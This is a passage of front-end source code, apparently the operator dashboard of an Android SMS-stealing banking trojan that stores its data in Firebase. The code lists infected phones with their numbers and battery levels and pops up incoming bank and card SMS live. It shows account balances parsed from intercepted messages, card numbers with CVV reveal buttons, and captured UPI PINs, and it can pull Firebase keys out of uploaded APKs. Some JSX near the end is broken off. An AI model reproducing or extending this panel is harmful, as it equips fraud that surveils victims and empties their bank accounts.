                      <button onClick={e => deleteAccount(a.id, e)} className="p-1 rounded-lg bg-red-950/60 border border-red-900/40 text-red-400 hover:bg-red-900/60 transition-all">
                        <Icon name="Trash2" className="w-3 h-3" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>

              {/* Add server form */}
              {showAddForm ? (
                <div className="animate-fade-up mb-4 border border-[#1f1f1f] rounded-2xl p-4 bg-black/20">
                  <div className="flex items-center justify-between mb-3">
                    <h3 className="text-sm font-semibold text-white">Add Firebase Server</h3>
                    <button onClick={() => { setShowAddForm(false); setFormError(''); setApkResult(null); }} className="text-[#444] hover:text-[#888] transition-colors">
                      <Icon name="X" className="w-4 h-4" />
                    </button>
                  </div>
                  {/* Mode toggle */}
                  <div className="flex gap-2 mb-4">
                    {['single','multi'].map(m => (
                      <button key={m} onClick={() => setAddMode(m)} className={`flex-1 py-1.5 rounded-lg text-xs font-semibold transition-all ${addMode === m ? 'bg-red-600/20 border border-red-600/30 text-red-400' : 'bg-[#111] border border-[#1e1e1e] text-[#555] hover:text-[#888]'}`}>
                        {m === 'single' ? 'Single Server' : 'Multiple (Linewise)'}
                      </button>
                    ))}
                  </div>

                  {addMode === 'single' ? (
                    <div className="space-y-3">
                      {/* APK upload */}
                      <div>
                        <label className="block text-[10px] font-semibold uppercase tracking-wider text-[#555] mb-1.5">Extract from APK (optional)</label>
                        {!apkResult && !apkLoading && (
                          <label
                            onDrop={e => { e.preventDefault(); const f = e.dataTransfer.files[0]; if (f) handleApkFile(f); }}
                            onDragOver={e => e.preventDefault()}
                            className="flex items-center gap-3 py-3 px-4 rounded-xl border-2 border-dashed border-[#2a2a2a] hover:border-orange-500/40 hover:bg-orange-950/10 cursor-pointer transition-all group">
                            <Icon name="Upload" className="w-4 h-4 text-[#444] group-hover:text-orange-400 transition-colors flex-shrink-0" />
                            <div>
                              <p className="text-xs font-semibold text-[#555] group-hover:text-[#888]">Upload APK File</p>
                              <p className="text-[10px] text-[#333]">Auto-extracts Firebase URL &amp; API Key</p>
                            </div>
                            <input ref={fileRef} type="file" accept=".apk,.zip" onChange={e => { const f = e.target.files?.[0]; if (f) handleApkFile(f); e.target.value = ''; }} className="hidden" />
                          </label>
                        )}
                        {apkLoading && (
                          <div className="flex items-center gap-3 py-4 rounded-xl border border-[#1f1f1f] bg-[#0d0d0d]">
                            <div className="w-5 h-5 border-2 border-orange-900/50 border-t-orange-500 rounded-full animate-spin ml-4" />
                            <div>
                              <p className="text-xs font-semibold text-orange-400">Scanning APK…</p>
                              <p className="text-[10px] text-[#444] font-mono truncate max-w-[180px]">{apkFileName}</p>
                            </div>
                          </div>
                        )}
                        {apkError && (
                          <div className="flex items-center gap-2 p-2.5 rounded-xl bg-red-950/30 border border-red-900/40 mt-1">
                            <p className="text-xs text-red-400 flex-1">{apkError}</p>
                            <button onClick={() => { setApkError(''); setApkResult(null); }} className="text-[#555] hover:text-[#888]"><Icon name="X" className="w-3 h-3" /></button>
                          </div>
                        )}
                        {apkResult && !apkLoading && (
                          <div className="rounded-xl border border-emerald-900/40 bg-emerald-950/20 p-2.5 mt-1">
                            <div className="flex items-center gap-1.5 mb-1.5">
                              <Icon name="Check" className="w-3.5 h-3.5 text-emerald-400" />
                              <span className="text-xs font-semibold text-emerald-400">Extracted Successfully</span>
                              <button onClick={() => { setApkResult(null); setApkError(''); setApkFileName(''); }} className="ml-auto text-[#444] hover:text-[#777]"><Icon name="X" className="w-3 h-3" /></button>
                            </div>
                            <div className="space-y-1">
                              {[['Firebase URL', apkResult.firebaseUrl], ['API Key', apkResult.apiKey]].map(([label, val]) => val && (
                                <div key={label}>
                                  <p className="text-[9px] text-[#444] uppercase tracking-wider mb-0.5">{label}</p>
                                  <div className="flex items-center gap-2 bg-[#0a0a0a] rounded-lg px-2 py-1 border border-[#1a1a1a]">
                                    <span className="text-[10px] font-mono text-emerald-300 flex-1 truncate">{val}</span>
                                    <CopyButton text={val} />
                                  </div>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}
                      </div>
                      <div>
                        <label className="block text-[10px] font-semibold uppercase tracking-wider text-[#555] mb-1.5">Server Name</label>
                        <input type="text" value={formName} onChange={e => setFormName(e.target.value)} placeholder={`Firebase Server ${accounts.length + 1}`} className="w-full px-3 py-2.5 rounded-xl bg-white/5 border border-white/10 focus:border-red-500 focus:ring-1 focus:ring-red-500/20 outline-none text-xs text-white placeholder:text-[#333] transition-all" />
                      </div>
                      <div>
                        <label className="block text-[10px] font-semibold uppercase tracking-wider text-[#555] mb-1.5">Firebase Database URL</label>
                        <input type="text" value={formUrl} onChange={e => setFormUrl(e.target.value)} placeholder="https://your-project.firebaseio.com" className="w-full px-3 py-2.5 rounded-xl bg-white/5 border border-white/10 focus:border-red-500 focus:ring-1 focus:ring-red-500/20 outline-none text-xs text-white placeholder:text-[#333] transition-all font-mono" />
                      </div>
                      <div>
                        <label className="block text-[10px] font-semibold uppercase tracking-wider text-[#555] mb-1.5">Database Secret / Auth Key</label>
                        <input type="text" value={formKey} onChange={e => setFormKey(e.target.value)} placeholder="Your Firebase secret key" className="w-full px-3 py-2.5 rounded-xl bg-white/5 border border-white/10 focus:border-red-500 focus:ring-1 focus:ring-red-500/20 outline-none text-xs text-white placeholder:text-[#333] transition-all font-mono" />
                      </div>
                      {formError && <p className="text-xs text-red-400 animate-fade-up">{formError}</p>}
                      <button onClick={addSingle} disabled={connecting} className="w-full flex items-center justify-center gap-2 py-2.5 red-gradient rounded-xl text-white font-semibold text-xs shadow-lg shadow-red-900/40 hover:opacity-90 transition-opacity disabled:opacity-50">
                        {connecting ? <div className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <Icon name="Plus" className="w-3.5 h-3.5" />}
                        {connecting ? 'Testing connection…' : 'Add Server'}
                      </button>
                    </div>
                  ) : (
                    <div className="space-y-3">
                      <div>
                        <label className="block text-[10px] font-semibold uppercase tracking-wider text-[#555] mb-1.5">Firebase URLs (one per line)</label>
                        <textarea value={multiUrls} onChange={e => setMultiUrls(e.target.value)} rows={4} placeholder={"https://project1.firebaseio.com\nhttps://project2.firebaseio.com\nhttps://project3.firebaseio.com"} className="w-full px-3 py-2.5 rounded-xl bg-white/5 border border-white/10 focus:border-red-500 focus:ring-1 focus:ring-red-500/20 outline-none text-xs text-white placeholder:text-[#333] transition-all font-mono resize-none" />
                      </div>
                      <div>
                        <label className="block text-[10px] font-semibold uppercase tracking-wider text-[#555] mb-1.5">Secret Keys (same order, one per line)</label>
                        <textarea value={multiKeys} onChange={e => setMultiKeys(e.target.value)} rows={4} placeholder={"secretKey1\nsecretKey2\nsecretKey3"} className="w-full px-3 py-2.5 rounded-xl bg-white/5 border border-white/10 focus:border-red-500 focus:ring-1 focus:ring-red-500/20 outline-none text-xs text-white placeholder:text-[#333] transition-all font-mono resize-none" />
                      </div>
                      <p className="text-[10px] text-[#444]">Each URL line must match its key line. Servers that fail connection check are skipped.</p>
                      {formError && <p className="text-xs text-red-400 animate-fade-up">{formError}</p>}
                      <button onClick={addMulti} disabled={connecting} className="w-full flex items-center justify-center gap-2 py-2.5 red-gradient rounded-xl text-white font-semibold text-xs shadow-lg shadow-red-900/40 hover:opacity-90 transition-opacity disabled:opacity-50">
                        {connecting ? <div className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <Icon name="Plus" className="w-3.5 h-3.5" />}
                        {connecting ? 'Testing connections…' : 'Add All Servers'}
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                <button onClick={() => { setShowAddForm(true); setFormError(''); setApkResult(null); }} className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl border border-dashed border-[#1f1f1f] hover:border-red-600/40 hover:bg-red-950/10 text-[#555] hover:text-red-400 transition-all text-xs font-semibold mb-4">
                  <Icon name="Plus" className="w-3.5 h-3.5" />
                  Add Firebase Server
                </button>
              )}

              {/* Connect button */}
              <button onClick={connectSelected} disabled={selectedIds.size === 0}
                className="w-full flex items-center justify-center gap-2 py-3 red-gradient rounded-xl text-white font-bold text-sm shadow-lg shadow-red-900/40 hover:opacity-90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed">
                <Icon name="ChevronRight" className="w-4 h-4" />
                {selectedIds.size === 0 ? 'Select servers to connect' : `Open Dashboard (${selectedIds.size} server${selectedIds.size !== 1 ? 's' : ''})`}
              </button>
            </div>

            <p className="text-center text-xs text-[#333] mt-6">PROFEX Admin Console · All connections are logged</p>
          </div>

          {/* Share modal */}
          {shareUrl && (
            <div className="fixed inset-0 z-50 flex items-center justify-center px-4" style={{ background: 'rgba(0,0,0,0.75)', backdropFilter: 'blur(6px)' }} onClick={() => setShareUrl('')}>
              <div className="w-full max-w-md glass-card rounded-2xl p-6 shadow-2xl shadow-black/80 animate-fade-up" onClick={e => e.stopPropagation()}>
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-xl bg-blue-950 border border-blue-800/60 flex items-center justify-center">
                      <Icon name="Link" className="w-4 h-4 text-blue-400" />
                    </div>
                    <div>
                      <h3 className="font-semibold text-white text-sm">Share Connection</h3>
                      <p className="text-xs text-[#555]">Anyone with this link can connect directly</p>
                    </div>
                  </div>
                  <button onClick={() => setShareUrl('')} className="p-1.5 rounded-lg hover:bg-white/5 transition-colors text-[#555]">
                    <Icon name="X" className="w-4 h-4" />
                  </button>
                </div>
                <div className="flex items-center gap-2 bg-white/5 border border-white/10 rounded-xl px-3 py-2.5 mb-4">
                  <span className="text-xs font-mono text-[#666] flex-1 truncate select-all">{shareUrl}</span>
                  <button onClick={() => { navigator.clipboard.writeText(shareUrl); setShareCopied(true); setTimeout(() => setShareCopied(false), 2000); }}
                    className={`flex-shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${shareCopied ? 'bg-emerald-950 border border-emerald-700/60 text-emerald-400' : 'bg-blue-950 border border-blue-800/60 text-blue-400 hover:bg-blue-900'}`}>
                    <Icon name={shareCopied ? 'Check' : 'Copy'} className="w-3 h-3" />
                    {shareCopied ? 'Copied!' : 'Copy'}
                  </button>
                </div>
                <div className="flex items-start gap-2 p-3 rounded-xl bg-yellow-950/30 border border-yellow-900/40">
                  <Icon name="Shield" className="w-4 h-4 text-yellow-500 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-yellow-400/80">This link contains your Firebase credentials. Only share with trusted people.</p>
                </div>
              </div>
            </div>
          )}
        </div>
      );
    }

    // ─── SmsLivePopup ────────────────────────────────────────────────────────────
    function SmsLivePopup({ msg, onDismiss, onOpen }) {
      if (!msg) return null;
      const isBank = /AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(msg.text);
      const isCard = /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(msg.text);
      const accent = isCard ? '#a855f7' : isBank ? '#22c55e' : '#6acfff';
      const bg = isCard ? 'rgba(15,10,30,0.97)' : isBank ? 'rgba(5,18,10,0.97)' : 'rgba(8,12,20,0.97)';
      const borderColor = isCard ? 'rgba(168,85,247,0.3)' : isBank ? 'rgba(34,197,94,0.3)' : 'rgba(106,207,255,0.25)';
      return (
        <div
          className={msg.exiting ? 'sms-popup-exit' : 'sms-popup-enter'}
          onClick={onOpen}
          style={{
            position: 'fixed', bottom: 80, left: '50%',
            zIndex: 200, width: 300, maxWidth: 'calc(100vw - 32px)',
            background: bg, border: `1px solid ${borderColor}`,
            borderLeft: `3px solid ${accent}`,
            borderRadius: 16, padding: '10px 14px 10px 12px',
            boxShadow: '0 8px 32px rgba(0,0,0,0.8)',
            backdropFilter: 'blur(16px)',
            pointerEvents: 'auto',
            cursor: 'pointer',
            userSelect: 'none',
            WebkitTapHighlightColor: 'transparent',
          }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 4 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
              <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#22c55e', boxShadow: '0 0 5px #22c55e', flexShrink: 0, display: 'inline-block' }} />
              <span style={{ fontSize: 10, fontWeight: 700, color: accent, letterSpacing: 0.3 }}>{msg.deviceName}</span>
              <span style={{ fontSize: 9, color: '#444', marginLeft: 2 }}>·</span>
              <span style={{ fontSize: 9, fontWeight: 600, color: '#555' }}>{msg.sender}</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
              <span style={{ fontSize: 9, color: '#555', fontWeight: 600 }}>Tap to open</span>
              <button onClick={e => { e.stopPropagation(); onDismiss(); }}
                style={{ background: 'none', border: 'none', color: '#444', cursor: 'pointer', padding: 2, lineHeight: 1 }}>
                <Icon name="X" className="w-3 h-3" />
              </button>
            </div>
          </div>
          <p style={{ fontSize: 11, color: '#cccccc', lineHeight: 1.5, margin: 0, maxHeight: 52, overflow: 'hidden', wordBreak: 'break-word' }}>
            {msg.text.substring(0, 140)}{msg.text.length > 140 ? '…' : ''}
          </p>
          <div style={{ marginTop: 6, height: 2, borderRadius: 2, background: 'rgba(255,255,255,0.05)', overflow: 'hidden' }}>
            <div style={{ height: '100%', background: accent, width: '100%', animation: 'shrink 4.5s linear forwards', transformOrigin: 'left' }} />
          </div>
        </div>
      );
    }

    // ─── DeviceCard ───────────────────────────────────────────────────────────────
    function DeviceCard({ device: d, onClick, serverColor }) {
      const hasBank = d.smsAnalysis && d.smsAnalysis.bankBalances.length > 0;
      const hasCard = d.smsAnalysis && d.smsAnalysis.cards.length > 0;
      const topBank = hasBank ? d.smsAnalysis.bankBalances[0] : null;
      const phone = d.phoneNumber !== '—' ? d.phoneNumber : d.smsAnalysis?.phoneNumbers[0] || '—';
      const network = d.provider !== '—' ? d.provider : d.smsAnalysis?.networks[0] || null;
      const fav = isFavorite(d.id, d.serverId);

      return (
        <div onClick={onClick}
          className="group relative bg-[#111111] border border-[#1f1f1f] rounded-2xl p-4 cursor-pointer transition-all duration-200 hover:border-[#2a2a2a] hover:bg-[#161616] hover:shadow-xl hover:shadow-black/40 hover:-translate-y-0.5 active:translate-y-0">
          
          <div className="flex items-start gap-3 mb-3">
            <div className={`w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 ${d.status ? 'bg-emerald-500/15 border border-emerald-500/25' : 'bg-[#1a1a1a] border border-[#262626]'}`}>
              <Icon name="Smartphone" className={`w-5 h-5 ${d.status ? 'text-emerald-400' : 'text-[#444]'}`} />
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-2">
                <h3 className="text-sm font-bold text-white truncate leading-tight">{d.name}</h3>
                <button onClick={e => { e.stopPropagation(); toggleFavoriteDevice(d.id, d.serverId); }}
                  className={`p-0.5 rounded transition-all ${fav ? 'text-yellow-400' : 'text-[#333] hover:text-[#555]'}`}
                  title={fav ? 'Remove from favorites' : 'Add to favorites'}>
                  <Icon name="Star" className={`w-3.5 h-3.5 ${fav ? 'fill-yellow-400' : ''}`} />
                </button>
              </div>
              <p className="text-[10px] font-mono text-[#555] mt-0.5 truncate">{d.id}</p>
              {d.serverName && <p className="text-[9px] text-[#333] mt-0.5 truncate">{d.serverName}</p>}
            </div>
            <div className="flex items-center gap-1 flex-shrink-0">
              {d.upipin && <Icon name="Key" className="w-3.5 h-3.5 text-amber-400" />}
              {hasBank && <Icon name="Banknote" className="w-3.5 h-3.5 text-emerald-400" />}
              {hasCard && <Icon name="CreditCard" className="w-3.5 h-3.5 text-purple-400" />}
              <button onClick={e => { e.stopPropagation(); onClick(); }} className="p-1 rounded-lg text-[#444] hover:text-[#888] hover:bg-white/5 transition-colors">
                <Icon name="ChevronRight" className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-3 mb-3">
            <div>
              <p className="text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1">Android</p>
              <p className="text-sm font-bold text-[#ccc]">{d.android !== '—' ? `v${d.android.replace('v','')}` : '—'}</p>
            </div>
            <div>
              <p className="text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1">Battery</p>
              <BatteryBar percent={d.batteryPercent} />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-3 mb-3">
            <div>
              <p className="text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1">Number</p>
              <p className="text-xs font-mono text-[#aaa] truncate">{phone}</p>
            </div>
            {network && (
              <div>
                <p className="text-[9px] font-semibold uppercase tracking-widest text-[#444] mb-1">Network</p>
                <p className="text-xs font-semibold text-[#aaa] truncate">{network}</p>
              </div>
            )}
          </div>

          {topBank && (
            <div className="mb-3 px-3 py-2 rounded-xl bg-emerald-950/20 border border-emerald-900/20">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-1.5">
                  <Icon name="Banknote" className="w-3.5 h-3.5 text-emerald-400" />
                  <span className="text-[10px] font-semibold text-emerald-400">{topBank.bankName}</span>
                  {topBank.accountLast4 && <span className="text-[9px] font-mono text-[#444]">••{topBank.accountLast4}</span>}
                </div>
                <span className="text-sm font-black text-white">₹{formatCurrency(topBank.availableBalance)}</span>
              </div>
              {topBank.transactionType && (
                <div className="flex items-center gap-1 mt-1">
                  <span className={`text-[9px] font-semibold ${topBank.transactionType === 'credit' ? 'text-emerald-500' : 'text-red-500'}`}>
                    {topBank.transactionType === 'credit' ? '+' : '-'}₹{formatCurrency(topBank.transactionAmount || '0')} {topBank.transactionType}
                  </span>
                </div>
              )}
            </div>
          )}

          {hasCard && (
            <div className="mb-3 px-3 py-1.5 rounded-xl bg-purple-950/20 border border-purple-900/20 flex items-center gap-2">
              <Icon name="CreditCard" className="w-3.5 h-3.5 text-purple-400" />
              <span className="text-[10px] font-semibold text-purple-400">Card ••{d.smsAnalysis.cards[0].cardLast4}</span>
              {d.smsAnalysis.cards[0].cardType && <span className="text-[10px] text-[#555]">{d.smsAnalysis.cards[0].cardType}</span>}
              <span className="ml-auto text-[9px] text-purple-600">Available</span>
            </div>
          )}

          <div className="flex items-center gap-2 flex-wrap">
            <span className={`w-2 h-2 rounded-full flex-shrink-0 ${d.status ? 'bg-emerald-500' : 'bg-[#333]'}`} style={d.status ? { boxShadow: '0 0 6px #22c55e' } : {}} />
            {d.status ? (
              <span className="text-xs font-semibold text-emerald-400">Online</span>
            ) : (
              <div className="flex items-center gap-1.5 min-w-0">
                <span className="text-xs text-[#555]">Offline</span>
                {d.lastSeen && <span className="text-[10px] font-mono text-[#444] bg-[#111] px-1.5 py-0.5 rounded border border-[#1e1e1e]">{timeAgo(d.lastSeen)}</span>}
              </div>
            )}
            <button onClick={e => { e.stopPropagation(); toggleFavoriteDevice(d.id, d.serverId); }}
              className={`p-0.5 rounded transition-all ${fav ? 'text-yellow-400' : 'text-[#333] hover:text-[#555]'}`}

              <Icon name="Star" className={`w-3.5 h-3.5 ${fav ? 'fill-yellow-400' : ''}`} />

            {d.upipin && <span className="px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400">UPI PIN</span>}
          </div>

    // ─── DevicePanel ──────────────────────────────────────────────────────────────
    function InfoRow({ label, value, mono, highlight }) {

    function BankCard({ b }) {
      const isCredit = b.transactionType === 'credit';
      return (
        <div className="p-3 rounded-xl bg-[#0a1410] border border-emerald-900/30 border-l-2 border-l-emerald-500/70">
          <div className="flex items-center justify-between mb-2">
            <div className="flex items-center gap-2">
              <div className="w-6 h-6 rounded-lg bg-emerald-500/15 border border-emerald-500/25 flex items-center justify-center">
                <Icon name="Banknote" className="w-3 h-3 text-emerald-400" />
              </div>
              <div>
                <span className="text-xs font-bold text-emerald-400">{b.bankName}</span>
                <span className="text-[10px] text-[#444] ml-1.5 font-mono">{b.senderName}</span>
              </div>
              {b.accountLast4 && <span className="text-[10px] font-mono text-[#555] bg-[#111] px-1.5 py-0.5 rounded">••{b.accountLast4}</span>}
            </div>
            {b.transactionType && (
              <span className={`flex items-center gap-0.5 text-[10px] font-semibold px-2 py-0.5 rounded-full ${isCredit ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : 'bg-red-500/10 text-red-400 border border-red-500/20'}`}>
                <Icon name={isCredit ? 'ArrowDownLeft' : 'ArrowUpRight'} className="w-3 h-3" />
                {isCredit ? 'Credit' : 'Debit'}
              </span>
            )}
          </div>
          <div className="flex items-end justify-between">
            <div>
              <p className="text-[9px] uppercase tracking-widest text-[#555] mb-0.5">Available Balance</p>
              <p className="text-xl font-black text-white"><span className="text-emerald-400 text-sm mr-0.5">₹</span>{formatCurrency(b.availableBalance)}</p>
            </div>
            {b.transactionAmount && b.transactionAmount !== b.availableBalance && (
              <div className="text-right">
                <p className="text-[9px] uppercase tracking-widest text-[#555] mb-0.5">Transaction</p>
                <p className={`text-sm font-bold ${isCredit ? 'text-emerald-400' : 'text-red-400'}`}>{isCredit ? '+' : '-'}₹{formatCurrency(b.transactionAmount)}</p>
              </div>
            )}
          </div>
          {(b.phoneFromSms || b.networkFromSms) && (
            <div className="flex items-center gap-3 mt-2 pt-2 border-t border-[#151f15]">
              {b.phoneFromSms && <div className="flex items-center gap-1"><Icon name="Phone" className="w-3 h-3 text-blue-400" /><span className="text-[10px] font-mono text-[#777]">{b.phoneFromSms}</span></div>}
              {b.networkFromSms && <div className="flex items-center gap-1"><Icon name="Wifi" className="w-3 h-3 text-purple-400" /><span className="text-[10px] text-[#777]">{b.networkFromSms}</span></div>}
            </div>
          )}
          <p className="text-[10px] text-[#333] mt-2 leading-relaxed line-clamp-2">{b.rawSms.substring(0, 130)}</p>
          {b.detectedAt && <p className="text-[9px] text-[#2a2a2a] mt-1 font-mono">{b.detectedAt}</p>}
        </div>
      );
    }

    function CardItem({ c }) {
      const [showCvv, setShowCvv] = useState(false);
      return (
        <div className="p-3 rounded-xl bg-[#0f0a1a] border border-purple-900/30 border-l-2 border-l-purple-500/70">
          <div className="flex items-center justify-between mb-2">
            <div className="flex items-center gap-2">
              <div className="w-6 h-6 rounded-lg bg-purple-500/15 border border-purple-500/25 flex items-center justify-center">
                <Icon name="CreditCard" className="w-3 h-3 text-purple-400" />
              </div>
              <span className="text-xs font-bold text-purple-400">{c.cardType || 'Card'}</span>
            </div>
            {c.expiry && <span className="text-[10px] text-[#555] font-mono">Exp: {c.expiry}</span>}
          </div>
          <p className="font-mono text-xs text-[#aaa]">•••• •••• •••• {c.cardLast4}</p>
          {c.cvv && (
            <div className="flex items-center gap-2 mt-2">
              <span className="text-[10px] uppercase tracking-widest text-[#555]">CVV:</span>

              <button onClick={() => setShowCvv(v => !v)} className="p-0.5 text-[#444] hover:text-purple-400 transition-colors">
